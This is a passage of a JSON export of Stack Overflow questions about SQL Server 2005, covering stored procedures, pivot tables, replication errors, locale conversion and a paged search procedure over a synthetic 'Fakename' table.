=&gt; Avoid conflict; Don't \"walk your talk\"; Hedging, holding back; Overly ambitious; Problems with keeping confidences; Spread too thin, can't say no; Too anxious to make the sale; Treat others differently; Won't take a stand\n                [map] =&gt; Integrity and trust are on almost every success profile we see.  It is a basic threshold requirement to be a part of the team.  Without it, almost nothing else matters.  To think that people question our integrity or don't totally trust us is very difficult to accept.  The more common causes are personal disorganization, inconsistencies and habits that get us into trouble.  Many of us simply haven't thought through the impact of our actions and have little idea how we come across.  It can also be a lack of integrity in the bigger sense; people just don't buy what you say.\n                [created] =&gt; \n                [modified] =&gt; \n            )\n\n    )\n</code></pre>\n\n<p>)</p>\n\n<p>Notice that this should be returning an array of objects. The first array item is returning [0] and returning the object in a weird way. The rest are returning just fine. </p>\n\n<p>We are not big on MSSQL and are not aware of how this would be generated like this with CakePHP. Here is the controller code that is outputting that data:</p>\n\n<pre><code>$this-&gt;paginate = array(\n        'conditions' =&gt; $conditions,\n        'recursive' =&gt; -1,\n        'fields' =&gt; array('PerformanceDevelopmentComment.*', 'Employee.*', /*'Contact.last_name', 'Contact.first_name', 'PerformanceDevelopmentObject.*', 'Competency.*'*/),\n\n        'joins' =&gt; array(\n                array(\n                    'alias' =&gt; 'Employee',\n                    'table' =&gt; 'employees',\n                    'type' =&gt; 'INNER',\n                    'conditions' =&gt; 'PerformanceDevelopmentComment.employee_id = Employee.id'\n\n                )\n                ,\n                array(\n                    'alias' =&gt; 'Contact',\n                    'table' =&gt; 'contacts',\n                    'type' =&gt; 'INNER',\n                    'conditions' =&gt; 'Employee.contact_id = Contact.id'\n\n                ),\n                array(\n                    'alias' =&gt; 'PerformanceDevelopmentObject',\n                    'table' =&gt; 'performance_development_objects',\n                    'type' =&gt; 'INNER',\n                    'conditions' =&gt; 'PerformanceDevelopmentObject.id = PerformanceDevelopmentComment.performance_development_object_id'\n\n                ),\n                array(\n                    'alias' =&gt; 'Competency',\n                    'table' =&gt; 'competencies',\n                    'type' =&gt; 'INNER',\n                    'conditions' =&gt; 'PerformanceDevelopmentObject.competency_id = Competency.id'\n\n                )\n        )\n\n    );\n</code></pre>\n\n<p>We havent run into this before so I dont know exactly the correct questions to ask so any help would be appreciated. I will do my best to explain further and provide anymore data to help fix the problem. Thanks in advance...</p>\n"},{"tags":["asp.net","sql-server-2005","visual-studio-2008","datagridview"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":819,"score":0,"question_id":11405474,"title":"Passing DateTime variables into SQL Server stored procedures in Visual Studio 2008","body":"<p>I have a stored procedure in SQL Server 2005 that looks like this:</p>\n\n<pre><code>CREATE PROCEDURE [dbo].[REP_PayRange]\n    @StartDate datetime = NULL,\n    @EndDate datetime = NULL\nAS\nBEGIN\n    SET NOCOUNT ON;\n    SELECT * FROM Payment WHERE PayTime BETWEEN @StartDate AND @EndDate\nEND\n</code></pre>\n\n<p>It executes and I get results from within SQL by running:</p>\n\n<pre><code>EXEC REP_PayRange '1 Jan 2012', '10 Jan 2012'\n</code></pre>\n\n<p>The place I'm having difficulty is in Visual Studio. </p>\n\n<p>Here are the steps I'm taking:</p>\n\n<ol>\n<li>Create a new, blank, \"Web Form\"/aspx page with the Visual Basic language selected</li>\n<li>Insert a GridView</li>\n<li>Choose a datasource and select \"Database\"</li>\n<li>Choose a Data Connection that I have confirmed works (SQL Server Native)</li>\n<li>\"Specify a custom SQL statement or stored procedure\"</li>\n<li>Select \"Stored Procedure:\" \"REP_PayRange\"</li>\n<li>Choose \"Parameter source: None\" and Default Value \"1 Jan 2012\" for StartDate and \"Parameter source: None\" and Default Value \"10 Jan 2012\" for EndDate</li>\n<li>On the Test Query page I hit \"Test Query\", make sure my values are what I specified above and no data is returned.  If I save this and preview it in the browser the GridView is empty.</li>\n</ol>\n\n<p>I'd like to create my webpage using this method so that I can later change my parameter source to a calendar rather than the default values.</p>\n\n<p>Thank you in advance for any help or tips.</p>\n"},{"tags":["sql","sql-server-2005","pivot","pivot-table"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":83,"score":1,"question_id":11402235,"title":"Trouble with Pivot Tables","body":"<p>I know there are a lot of Pivot table examples on the internet, however I'm new to SQL and I'm having a bit of trouble as all the examples seem to be pertaining to aggregate functions.</p>\n\n<pre><code>Table 1:\n\n|Date         | Tag  |Value |\n|06/10 2:00pm |  A   |  65  | \n|06/10 2:00pm |  B   |  44  |\n|06/10 2:00pm |  C   |  33  |\n|06/10 2:02pm |  A   |  12  |\n|06/10 2:02pm |  B   |  55  |\n|06/10 2:02pm |  C   |  21  |\n....\n|06/10 1:58am |  A   |  23  |\n</code></pre>\n\n<hr>\n\n<p>What I would like it to look like is (table 2):</p>\n\n<pre><code>|Date        |  A  |  B  |  C  |\n|06/10 2:00pm|  65 |  44 |  33 | \n|06/10 2:02pm|  12 |  55 |  21 | \n.....\n|06/10 1:58am| 23 | etc.  | etc. |\n</code></pre>\n\n<p>(sorry for the format)</p>\n\n<p>Some problems that  encounter (doesn't work with code I have found online)\nI'd like to run this as a stored procedure (rather a SQL job), every 2 minutes so that this data from table 1 is constantly being moved to table 2.  However I think I would need to alter the date every single time? (thats the syntax I've seen)\nThe pivot table itself seems simple on its own, but the datetime has been causing me grief.\nAny code snipets or links would be greatly appreciated.</p>\n\n<p>Thanks.</p>\n"},{"tags":["sql","tsql","sql-server-2005","database-design","publish-subscribe"],"answer_count":3,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":258,"score":7,"question_id":11268724,"title":"Publish / Subscribe pattern in SQL","body":"<p><strong>Background:</strong></p>\n\n<p>We have a large (15+ million) table of items which is updated frequently throughout the day (average 300K daily changes).  Pending changes are stored in a staging table, and a job runs throughout the day to read changes from this table, make the updates, and mark the changes as processed.</p>\n\n<p>Many other applications use the data in the items table to perform various tasks.  Often, these tasks are scheduled and intensive, as they involve comparing live data with old snapshots, and updating other systems accordingly.  For example, we list items on eBay, and compare live item data with our existing listings to see whether we need to insert any new eBay listings, remove items we've sold, update quantities, etc.  Because the data is so large, most of these applications run infrequently, leaving things out of date much of the time.</p>\n\n<p><strong>My Question:</strong></p>\n\n<p>We are considering implementing a publisher/subscriber pattern using the Service Broker.  The goal would be to publish a message when an item changes, which various other systems (like our eBay application) can subscribe to.  This would enable us to make more granular updates closer to real-time, rather than large and infrequent updates that involve querying all data, not just what has changed.  However, after using the Google it doesn't seem like this is a common database pattern, and that raises red flags.  Is this not a valid use of the Service Broker (though I found a small section in <em>Pro Sql Server 2008 Service Broker</em> on doing Pub/Sub)?  How is this problem normally solved?  It seems like a common enough problem.</p>\n\n<p><strong>TL;DR:</strong></p>\n\n<p>Goal: Update various systems in a dynamic, loosely coupled way when single items change.</p>\n\n<p>Question: Is a pub/sub style solution implemented with Service Broker a viable solution in a high volume setting?</p>\n"},{"tags":["sql","sql-server-2008","sql-server-2005","localization"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":108,"score":1,"question_id":11400999,"title":"Inconsistent DATETIME/FLOAT conversion with CONVERT when user language not English","body":"<p>I have some trouble with SQL Server 2005 and SQL Server 2008 when working with values which have a different representation in German than in English. Server and OS are running as German versions.</p>\n\n<pre><code>SET LANGUAGE deutsch;\nSELECT \n    CONVERT(datetime, '31. Dezember 1999') as a, \n    CONVERT(nvarchar, CONVERT(datetime, '31. Dezember 1999')) as b, \n    CONVERT(float,'3.14159') as p,\n    CONVERT(nvarchar, CONVERT(float,'3.14159')) as q;\n</code></pre>\n\n<p>the output in the management console is this: </p>\n\n<pre><code>a=1999-12-31 00:00:00.000   \nb=Dez 31 1999 12:00AM\nc=3,14159   \nd=3.14159\ndateformat=dmy\n</code></pre>\n\n<p>This is inconsistent. In (a) the <em>German</em> representation of Dec-31-1999 is correctly parsed and displayed (and only German works..). Converting the same date explicitly with CONVERT returns a string which mixes an <em>English</em> date format with a <em>German</em> abbreviated month name (it says \"Dez 31\" not \"Dec 31\" if you look closely). </p>\n\n<p>But p is converted from a string in <em>English</em> notation (decimal point) into a float, yet displayed in <em>German</em> notation (using a decimal comma), while explicit conversion to nvarchar yields the number in <em>English</em> notation again. OTOH CONVERT() does not accept input in German notation for conversion to float.</p>\n\n<p>So, I have a CONVERT function: </p>\n\n<ol>\n<li>which accepts strings for conversion to datetime in <em>German</em> notation only.</li>\n<li>but accepts strings for conversion to float in <em>English</em> only.</li>\n<li>and converts datetime values to nvarchar mixing both <em>German and English</em>.</li>\n<li>converts float values to <em>English</em>.</li>\n</ol>\n\n<p>But what I need is a function in SQL Server 2005, 2008 which converts text from the current user language to values of the supported types (datetime, floats...) and converts these values back into a text representation with respect to the current user language. </p>\n\n<p>What is this function? </p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":140,"score":1,"question_id":7348147,"title":"Retrieve Configured value SQL Error Log","body":"<p>Dear Friends,</p>\n\n<p><img src=\"http://i.stack.imgur.com/8GP7O.gif\" alt=\"enter image description here\"></p>\n\n<p>I want to retrieve the maximum number of error log file value using SQL Query.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":86,"score":0,"question_id":11401221,"title":"UPDATE sql query from two table values","body":"<p>I have 2 tables with values stored as below.</p>\n\n<p><strong>Table1</strong></p>\n\n<pre><code>ReferranceID   StatusNumber   ServiceType            T2OpenDt          T1OpenDT\n162987          399519        Orthopaedic Surgery       NULL           2011-08-19 \n162987          399525        Acupuncture               NULL           2011-08-19 \n162987          413405        Anesthesiology            NULL           2011-09-28 \n162987          517174        Chiropractic              NULL           2012-04-26\n</code></pre>\n\n<p><strong>Table2</strong></p>\n\n<pre><code>ReferranceID StatusNumber   Status     T2OpenDate\n162987       256033         Closed     2010-11-17 \n162987       488518         ReOpen     2012-02-22 \n</code></pre>\n\n<p>The first table should be updated as below from the 2nd table. (i.e the Result values)</p>\n\n<pre><code>ReferranceID   StatusNumber   ServiceType               T2OpenDt          T1OpenDT\n162987          399519        Orthopaedic Surgery       2010-11-17         2011-08-19 \n162987          399525        Acupuncture               2010-11-17         2011-08-19 \n162987          413405        Anesthesiology            2010-11-17         2011-09-28 \n162987          517174        Chiropractic              2012-02-22         2012-04-26 \n</code></pre>\n\n<p><strong>'2010-11-17'</strong> will be updated in <strong>3 rows</strong> since the T2OpenDate is less than T1Opendate and\nthere is only one occurance of <strong>2012-02-22</strong> since this date is slightly greater than other 3 top T1OpenDate and less than the 4th T1OpenDate. </p>\n\n<p>Could anybody suggest me the UPDATE sqlquery for the above.  Thank you so very much for helping me.</p>\n"},{"tags":["sql","sql-server","sql-server-2005","case","where-clause"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":133,"score":-1,"question_id":11399727,"title":"Using Case statement in Where clause","body":"<p>In my query I have the following condition</p>\n\n<pre><code>left Join Table2 on Table2.Id = Table1.Id and Table2.status in  ('Close', 'Open')\n</code></pre>\n\n<p>And the above condition gives me 2 extra rows because of the left join. I noticed that if I have only either Close or Open in the condition it returns the correct number of rows.</p>\n\n<p>To fix that I was trying to write something like this </p>\n\n<pre><code>And  Table2.status = (Case Table2.status\n                WHEN 'Open' Then 'Open'\n                When 'Close' Then 'Close'   \n                 End ) \n</code></pre>\n\n<p>But this still returns 2 extra rows. Any suggestions on how to fix this??</p>\n"}]}
{"total":14387,"page":15,"pagesize":100,"questions":[{"tags":["sql-server-2005","windows-server-2003","crash-dumps"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":99,"score":0,"question_id":11395998,"title":"How can I read SQL Server 2005 mdmp dump files running on a Windows 2003 Server?","body":"<p>I am running a SQL Server 2005 with SP4 that is generating mdmp dump files. I am looking for a tool to read the files. How can I read SQL Server 2005 mdmp dump files running on a Windows 2003 Server? Thank you. </p>\n"},{"tags":["sql-server-2005","query","text"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":188,"score":1,"question_id":547040,"title":"MS SQL2005 Query/Stored Proc Results To Text using SqlCommand or any other method","body":"<p>I have a simple question.</p>\n\n<p>I need to return results as simple text, either as a string or similar. </p>\n\n<p>i.e. I want the same behavior such as </p>\n\n<p>Results to Text (Cntrl + T) </p>\n\n<p>When you run a Query from SQL Server Management Studio. </p>\n\n<p>How can this be done programmatically against calling a Stored Proc from C#?</p>\n\n<p>i.e. similar to <code>ExecuteReader();</code> or <code>ExecuteXMLReader();</code> but returning a string instead.  </p>\n\n<p>Is there some <code>ToString()</code> available?</p>\n\n<p>Thanks,\nKai.</p>\n"},{"tags":["sql-server-2005","merge-replication"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":337,"score":0,"question_id":11360331,"title":"SQL Server merge replication error \"The schema script 'xxx.sch' could not be propagated to the subscriber\"","body":"<p>I recently made some changes to a working publication under Merge replication which seem to have broken synchronization for the subscriber.</p>\n\n<p>The error message I'm getting is:</p>\n\n<pre><code>The schema script 'ftdb_arcmessagefac64b65_76.sch' could not be propagated\nto the subscriber. (Source: MSSQL_REPL, Error number: MSSQL_REPL-2147201001)\nGet help: http://help/MSSQL_REPL-2147201001\nThe process could not read file 'D:\\Program Files\\Microsoft SQL\nServer\\MSSQL.1\\MSSQL\\ReplData\\unc\\xxx\\20120701000581\\xxxx.sch' due to OS error 3. (Source: MSSQL_REPL, Error number: MSSQL_REPL0)\nGet help: http://help/MSSQL_REPL0\n</code></pre>\n\n<p>I've looked in the unc directory, and there's no directory <code>20120701000581</code>, but there's a directory <code>20120706110881</code> from when the snapshot of the publication was updated.</p>\n\n<p>I've tried reinitializing the subscription and recreating the snapshot, but the process still fails expecting the <code>20120701000581</code>.</p>\n\n<p>I haven't tried deleting and recreating the subscription yet, as I would rather get to the bottom of the issue before trying this. Can someone explain what may be happening and how to fix this?</p>\n"},{"tags":["sql","sql-server","sql-server-2005","parameter-passing"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":240,"score":1,"question_id":11281218,"title":"How to pass sql function parameter by value","body":"<p>This is part of a bigger selection, but I have stripped it down to the essential question :</p>\n\n<p>Compare this two SQL queries - the first works with a constant, the second with a variable, both have the same value (lets say 180). The one with the constant displays result immediately (e.g. within milliseconds), the one with the variable takes a few seconds to yield the same result.</p>\n\n<p>Where is the catch ?</p>\n\n<p>Query 1:</p>\n\n<pre><code>SELECT *\nFROM table\nWHERE field &gt; 180\n</code></pre>\n\n<p>Query 2:</p>\n\n<pre><code>DECLARE @V INT\nSET @v = 180\nSELECT *\nFROM table\nWHERE field &gt; @v\n</code></pre>\n"},{"tags":["sql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":2259,"score":1,"question_id":11384292,"title":"Warning: Null value is eliminated by an aggregate or other SET operation in Aqua Data Studio","body":"<p>I have a problem when data is null and the warning has appear when the result is display.\nHow to solve this problem?. How to change the null data to 0 when no data in the table?.</p>\n\n<p>This is my code:-</p>\n\n<pre><code>SELECT DISTINCT c.username             AS assigner_officer,\n                d.description          AS ticketcategory,\n                (SELECT Count(closed)\n                 FROM   ticket\n                 WHERE  assigned_to = c.user_id\n                        AND closed IS NOT NULL\n                 GROUP  BY assigned_to)closedcases,\n                (SELECT Count(closed)\n                 FROM   ticket\n                 WHERE  assigned_to = c.user_id\n                        AND closed IS NULL\n                 GROUP  BY assigned_to)opencases\nFROM   ticket a\n       JOIN ticketlog b\n         ON a.ticketid = b.ticketid\n       JOIN access c\n         ON a.assigned_to = c.user_id\n       JOIN ticket_category d\n         ON a.cat_code = d.id\n       JOIN lookup_department e\n         ON a.department_code = e.code \n</code></pre>\n\n<p>The result appear like this:-</p>\n\n<pre><code> Warnings: ---&gt; \n   W (1): Warning: Null value is eliminated by an aggregate or other SET operation.\n          &lt;--- \n assigner_officer     ticketcategory     closedcases     opencases    \n -------------------  -----------------  --------------  ------------ \n abdulhafiz           Enquiry            (null)          0            \n affan                Enquiry            12              (null)       \n amirul               Enquiry            1               (null)       \n azrul_fahmi          Enquiry            45              0            \n Azwani               Enquiry            (null)          0            \n chai                 Enquiry            4               (null)       \n dalinawati           Enquiry            1               0            \n Emmy                 Complaints         (null)          0            \n Fadhlia              Enquiry            38              0            \n fairulhalif          Others             1               (null)       \n farikh               Enquiry            (null)          0            \n ismailh              Enquiry            28              0            \n izzahanna            Enquiry            (null)          0            \n Kamsuzilawati        Enquiry            1               (null)     \n</code></pre>\n"},{"tags":["sql-server","sql-server-2005","sql-server-ce"],"answer_count":4,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":6025,"score":6,"question_id":2078672,"title":"How to use Stored Procedure in SqlCE","body":"<p>I have just installed <strong>Sql Server Compact Edition</strong>. To my surprise, we can't use stored procedure in sql server CE. Do I have any alternative of Stored Procedure in Sql Server CE.\nI am strongly obsessed with stored procedure, I can'nt think of an application without stored procedures. \n<br></p>\n\n<p>Please help, Thanks in advance.</p>\n\n<p><strong>Edit: Can I use Managed Stored Procedures.</strong></p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":11,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":4519,"score":2,"question_id":247901,"title":"How can I copy a SQL Server 2005 database from production to development?","body":"<p>We have a production SQL Server 2005 database server with the production version of our application's database on it.  I would like to be able to copy down the data contents of the production database to a development server for testing.</p>\n\n<p>Several sites (and Microsoft's forums) suggest using the Backup/Restore options to copy databases from one server from another, but this solution is unworkable for several reasons (I don't have backup authority on our production database, I don't want to overwrite permissions on the development server, I don't want to overwrite structure changes on the development server, etc...)</p>\n\n<p>I've tried using the SQL Import/Export Wizard in SQL Server 2005, but it always reports primary key violations.  How can I copy the contents of a database from the production server to development without using the \"Backup/Restore\" method?</p>\n"},{"tags":["sql-server","sql-server-2005","tsql"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":80,"score":0,"question_id":9593872,"title":"Stored Procedure to search a view","body":"<p>Apologies for the long post, I have tried to provide you with as much of an test environment as possible.</p>\n\n<p>I have spent several days optimizing this query as much as I can but I am wondering if there is a better approach for achieving the same result.</p>\n\n<p>Environment is SQL Server 2005. This stored procedure code is autogenerated by a Codesmith template.</p>\n\n<p>Table setup</p>\n\n<pre><code>USE [TestDatabase]\nGO\n/****** Object:  Table [dbo].[StateProvince]    Script Date: 03/07/2012 09:57:20 ******/\nSET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\nSET ANSI_PADDING ON\nGO\nCREATE TABLE [dbo].[StateProvince](\n[StateProvinceID] [int] IDENTITY(1,1) NOT NULL,\n[StateProvinceName] [varchar](50) NOT NULL,\nCONSTRAINT [PK_StateProvince] PRIMARY KEY CLUSTERED \n(\n[StateProvinceID] ASC\n)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\nGO\nSET ANSI_PADDING OFF\nGO\n/****** Object:  Table [dbo].[Gender]    Script Date: 03/07/2012 09:57:20 ******/\nSET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\nCREATE TABLE [dbo].[Gender](\n[GenderID] [int] IDENTITY(1,1) NOT NULL,\n[GenderName] [nchar](10) NOT NULL,\nCONSTRAINT [PK_Gender] PRIMARY KEY CLUSTERED \n(\n[GenderID] ASC\n)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\nGO\n/****** Object:  Table [dbo].[Fakename]    Script Date: 03/07/2012 09:57:20 ******/\nSET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\nCREATE TABLE [dbo].[Fakename](\n[FakeNameID] [int] IDENTITY(1,1) NOT NULL,\n[gender] [nvarchar](6) NOT NULL,\n[givenname] [nvarchar](20) NOT NULL,\n[middleinitial] [nvarchar](1) NOT NULL,\n[surname] [nvarchar](23) NOT NULL,\n[streetaddress] [nvarchar](100) NOT NULL,\n[city] [nvarchar](100) NOT NULL,\n[zipcode] [nvarchar](15) NOT NULL,\n[country] [nvarchar](2) NOT NULL,\n[emailaddress] [nvarchar](100) NOT NULL,\n[password] [nvarchar](25) NOT NULL,\n[telephonenumber] [nvarchar](25) NOT NULL,\n[maidenname] [nvarchar](23) NOT NULL,\n[birthday] [datetime] NOT NULL,\n[cctype] [nvarchar](10) NOT NULL,\n[ccnumber] [nvarchar](16) NOT NULL,\n[cvv2] [nvarchar](3) NOT NULL,\n[ccexpires] [nvarchar](10) NOT NULL,\n[nationalid] [nvarchar](15) NOT NULL,\n[upstracking] [nvarchar](24) NOT NULL,\n[occupation] [nvarchar](70) NOT NULL,\n[company] [nvarchar](70) NOT NULL,\n[domain] [nvarchar](70) NOT NULL,\n[bloodtype] [nvarchar](3) NOT NULL,\n[pounds] [decimal](5, 1) NOT NULL,\n[kilograms] [decimal](5, 1) NOT NULL,\n[feetinches] [nvarchar](6) NOT NULL,\n[centimeters] [smallint] NOT NULL,\n[guid] [nvarchar](36) NOT NULL,\n[latitude] [numeric](10, 6) NOT NULL,\n[longitude] [numeric](10, 6) NOT NULL,\n[StateProvinceID] [int] NOT NULL,\n[GenderID] [int] NULL,\nCONSTRAINT [PK_Fakename] PRIMARY KEY CLUSTERED \n(\n[FakeNameID] ASC\n)WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, ALLOW_PAGE_LOCKS  = ON) ON [PRIMARY]\n) ON [PRIMARY]\nGO\n/****** Object:  View [dbo].[vw_Fakename]    Script Date: 03/07/2012 09:57:21 ******/\nSET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\n--asdf\nCREATE VIEW [dbo].[vw_Fakename]\nAS\nSELECT \n[dbo].Fakename.FakeNameID,\n[dbo].Fakename.gender,\n[dbo].Fakename.givenname,\n[dbo].Fakename.middleinitial,\n[dbo].Fakename.surname,\n[dbo].Fakename.streetaddress,\n[dbo].Fakename.city,\n[dbo].Fakename.zipcode,\n[dbo].Fakename.country,\n[dbo].Fakename.emailaddress,\n[dbo].Fakename.password,\n[dbo].Fakename.telephonenumber,\n[dbo].Fakename.maidenname,\n[dbo].Fakename.birthday,\n[dbo].Fakename.cctype,\n[dbo].Fakename.ccnumber,\n[dbo].Fakename.cvv2,\n[dbo].Fakename.ccexpires,\n[dbo].Fakename.nationalid,\n[dbo].Fakename.upstracking,\n[dbo].Fakename.occupation,\n[dbo].Fakename.company,\n[dbo].Fakename.domain,\n[dbo].Fakename.bloodtype,\n[dbo].Fakename.pounds,\n[dbo].Fakename.kilograms,\n[dbo].Fakename.feetinches,\n[dbo].Fakename.centimeters,\n[dbo].Fakename.guid,\n[dbo].Fakename.latitude,\n[dbo].Fakename.longitude,\n[dbo].StateProvince.StateProvinceName,\n[dbo].Gender.GenderName\nFROM \n[dbo].Fakename\njoin [dbo].StateProvince ON [dbo].Fakename.StateProvinceID =  [dbo].StateProvince.StateProvinceID\njoin [dbo].Gender ON [dbo].Fakename.GenderID =  [dbo].Gender.GenderID\nGO\n/****** Object:  ForeignKey [FK_Fakename_Gender]    Script Date: 03/07/2012 09:57:20 ******/\nALTER TABLE [dbo].[Fakename]  WITH CHECK ADD  CONSTRAINT [FK_Fakename_Gender] FOREIGN KEY([GenderID])\nREFERENCES [dbo].[Gender] ([GenderID])\nGO\nALTER TABLE [dbo].[Fakename] CHECK CONSTRAINT [FK_Fakename_Gender]\nGO\n/****** Object:  ForeignKey [FK_Fakename_StateProvince]    Script Date: 03/07/2012 09:57:20 ******/\nALTER TABLE [dbo].[Fakename]  WITH CHECK ADD  CONSTRAINT [FK_Fakename_StateProvince] FOREIGN KEY([StateProvinceID])\nREFERENCES [dbo].[StateProvince] ([StateProvinceID])\nGO\nALTER TABLE [dbo].[Fakename] CHECK CONSTRAINT [FK_Fakename_StateProvince]\nGO\n</code></pre>\n\n<p>This is a search stored procedure which searches for multiple matches on a fakenames table, orders them and allows paging.</p>\n\n<pre><code>USE [TestDatabase]\nGO\nSET ANSI_NULLS ON\nGO\nSET QUOTED_IDENTIFIER ON\nGO\nALTER PROCEDURE [dbo].[vw_Fakename_SelectFilter]\n@Filter XML(ViewFilter),\n@OrderBy varchar(50),\n@OrderByDirection varchar(50),\n@iPageSize int                  = 50,\n@iPageNumber int                = 0\nAS\nSET NOCOUNT ON\n--DECLARE ALL THE FIELDS WHICH CAN BE SEARCHED ON\nDECLARE @FakeNameID INT\nDECLARE @gender nvarchar(6)\nDECLARE @givenname nvarchar(20)\nDECLARE @middleinitial nvarchar(1)\nDECLARE @surname nvarchar(23)\nDECLARE @streetaddress nvarchar(100)\nDECLARE @city nvarchar(100)\nDECLARE @zipcode nvarchar(15)\nDECLARE @country nvarchar(2)\nDECLARE @emailaddress nvarchar(100)\nDECLARE @password nvarchar(25)\nDECLARE @telephonenumber nvarchar(25)\nDECLARE @maidenname nvarchar(23)\nDECLARE @cctype nvarchar(10)\nDECLARE @ccnumber nvarchar(16)\nDECLARE @cvv2 nvarchar(3)\nDECLARE @ccexpires nvarchar(10)\nDECLARE @nationalid nvarchar(15)\nDECLARE @upstracking nvarchar(24)\nDECLARE @occupation nvarchar(70)\nDECLARE @company nvarchar(70)\nDECLARE @domain nvarchar(70)\nDECLARE @bloodtype nvarchar(3)\nDECLARE @feetinches nvarchar(6)\nDECLARE @guid nvarchar(36)\nDECLARE @StateProvinceName varchar(50)\n--If the @filter doesn't contain anything, then the proc takes like 20 seconds to run\nIf DATALENGTH(@Filter) &lt;= 0\nBEGIN\nSET @Filter = '&lt;ArrayOfDataFilter xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"&gt;&lt;/ArrayOfDataFilter&gt;'\nEND \nSET @iPageNumber = @iPageNumber + 1\n-------------------------------------\n--PAGE COUNTING\nDECLARE @iStartRecord int\nDECLARE @iEndRecord int\nSET @iStartRecord = (@iPageNumber - 1) * @iPageSize + 1\nSET @iEndRecord = @iPageNumber * @iPageSize     \n--SET THOSE VARIABLES\nSELECT\n@FakeNameID = (SELECT D.element.value('@Value','INT') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','NVARCHAR(256)') = 'FakeNameID'),\n@gender = (SELECT D.element.value('@Value','nvarchar(6)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(6)') = 'gender'),\n@givenname = (SELECT D.element.value('@Value','nvarchar(20)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(20)') = 'givenname'),\n@middleinitial = (SELECT D.element.value('@Value','nvarchar(1)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(1)') = 'middleinitial'),\n@surname = (SELECT D.element.value('@Value','nvarchar(23)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(23)') = 'surname'),\n@streetaddress = (SELECT D.element.value('@Value','nvarchar(100)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(100)') = 'streetaddress'),\n@city = (SELECT D.element.value('@Value','nvarchar(100)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(100)') = 'city'),\n@zipcode = (SELECT D.element.value('@Value','nvarchar(15)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(15)') = 'zipcode'),\n@country = (SELECT D.element.value('@Value','nvarchar(2)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(2)') = 'country'),\n@emailaddress = (SELECT D.element.value('@Value','nvarchar(100)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(100)') = 'emailaddress'),\n@password = (SELECT D.element.value('@Value','nvarchar(25)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(25)') = 'password'),\n@telephonenumber = (SELECT D.element.value('@Value','nvarchar(25)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(25)') = 'telephonenumber'),\n@maidenname = (SELECT D.element.value('@Value','nvarchar(23)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(23)') = 'maidenname'),\n@cctype = (SELECT D.element.value('@Value','nvarchar(10)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(10)') = 'cctype'),\n@ccnumber = (SELECT D.element.value('@Value','nvarchar(16)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE D.element.value('@Column','nvarchar(16)') = 'ccnumber'),\n@cvv2 = (SELECT D.element.value('@Value','nvarchar(3)') FROM @Filter.nodes('/ArrayOfDataFilter/DataFilter') AS D ( element ) WHERE 